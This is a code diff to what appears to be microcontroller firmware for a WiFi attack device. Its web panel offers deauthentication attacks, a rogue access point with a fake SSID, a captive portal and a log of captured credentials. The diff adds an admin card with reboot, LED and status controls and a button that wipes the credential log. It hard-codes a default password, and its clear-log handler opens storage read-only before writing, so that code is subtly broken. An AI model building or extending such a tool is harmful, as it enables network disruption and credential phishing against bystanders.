@@ -131,6 +131,15 @@ void handleRoot() {
   html += "<p>Networks: <strong id='netCount'>" + String(targetCount) + "</strong></p>";
   html += "</div>";
   
+  html += "<div class='card'><h2>WiFi Admin Panel</h2>";
+  html += "<p>Connected Clients: <strong id='clients'>0</strong></p>";
+  html += "<p>Uptime: <strong id='uptime'>0s</strong></p>";
+  html += "<p>Memory: <strong id='mem'>0 KB</strong></p>";
+  html += "<button onclick='reboot()'>Reboot Device</button>";
+  html += "<button onclick='toggleLED()'>Toggle LED</button>";
+  html += "<button onclick='factoryReset()'>Factory Reset</button>";
+  html += "</div>";
+  
   html += "<div class='card'><h2>WiFi Scanner</h2><button onclick='scan()'>Scan Networks</button><div id='networks'></div></div>";
   
   html += "<div class='card'><h2>Deauth Attack</h2><button class='btn-start' onclick='startDeauth()'>Start Deauth All</button><button class='btn-stop' onclick='stopDeauth()'>Stop</button></div>";
@@ -139,7 +148,7 @@ void handleRoot() {
   
   html += "<div class='card'><h2>Rogue AP</h2><input type='text' id='rogueSSID' value='Free_WiFi' placeholder='Fake SSID'><button onclick='startRogue()'>Start Rogue AP</button><button class='btn-danger' onclick='stopRogue()'>Stop</button></div>";
   
-  html += "<div class='card'><h2>Captured Credentials</h2><button onclick='loadLogs()'>Refresh Logs</button><div id='logs' class='log'>No credentials captured yet</div></div>";
+  html += "<div class='card'><h2>Captured Credentials</h2><button onclick='loadLogs()'>Refresh Logs</button><button onclick='clearLogs()'>Clear</button><div id='logs' class='log'>No credentials captured yet</div></div>";
   
   html += "<div class='card'><h2>Settings</h2><input type='text' id='newSSID' value='GMpro'><input type='text' id='newPASS' value='Sangkur87'><button onclick='saveSettings()'>Save and Reboot</button><button class='btn-danger' onclick='resetAll()'>Factory Reset</button></div>";
   
@@ -158,8 +167,13 @@ void handleRoot() {
   html += "function startRogue(){fetch('/rstart?ssid='+encodeURIComponent(document.getElementById('rogueSSID').value));}";
   html += "function stopRogue(){fetch('/rstop');}";
   html += "function loadLogs(){fetch('/logs').then(r=>r.text()).then(d=>document.getElementById('logs').textContent=d||'No data');}";
+  html += "function clearLogs(){fetch('/clearlogs').then(()=>loadLogs());}";
   html += "function saveSettings(){fetch('/save?ssid='+encodeURIComponent(document.getElementById('newSSID').value)+'&pass='+encodeURIComponent(document.getElementById('newPASS').value)).then(()=>alert('Saved! Rebooting...'));}";
   html += "function resetAll(){if(confirm('Factory reset?'))fetch('/reset');}";
+  html += "function reboot(){if(confirm('Reboot device?'))fetch('/reboot');}";
+  html += "function toggleLED(){fetch('/toggleled');}";
+  html += "function factoryReset(){if(confirm('Factory reset? ALL DATA WILL BE LOST!'))fetch('/reset');}";
+  html += "setInterval(()=>{fetch('/status').then(r=>r.json()).then(d=>{document.getElementById('clients').textContent=d.clients;document.getElementById('uptime').textContent=d.uptime;document.getElementById('mem').textContent=d.mem+' KB';});},3000);";
   html += "setInterval(scan,15000);scan();";
   html += "</script></body></html>";
   
@@ -307,6 +321,33 @@ void handleLogs() {
   server.send(200, "text/plain", log);
 }
 
+void handleClearLogs() {
+  prefs.begin("netherx", true);
+  prefs.putString("log", "");
+  prefs.end();
+  server.send(200, "text/plain", "OK");
+}
+
+void handleReboot() {
+  server.send(200, "text/plain", "Rebooting...");
+  delay(500);
+  ESP.restart();
+}
+
+void handleToggleLED() {
+  digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
+  server.send(200, "text/plain", "OK");
+}
+
+void handleStatus() {
+  String json = "{";
+  json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
+  json += "\"uptime\":\"" + String(millis() / 1000) + "s\",";
+  json += "\"mem\":" + String(ESP.getFreeHeap() / 1024);
+  json += "}";
+  server.send(200, "application/json", json);
+}
+
 void handleSave() {
   String ssid = server.arg("ssid");
   String pass = server.arg("pass");
@@ -363,6 +404,10 @@ void setup() {
   server.on("/rstart", handleRogueStart);
   server.on("/rstop", handleRogueStop);
   server.on("/logs", handleLogs);
+  server.on("/clearlogs", handleClearLogs);
+  server.on("/reboot", handleReboot);
+  server.on("/toggleled", handleToggleLED);
+  server.on("/status", handleStatus);
   server.on("/save", handleSave);
   server.on("/reset", handleReset);
   server.on("/generate_204", handleCaptive);
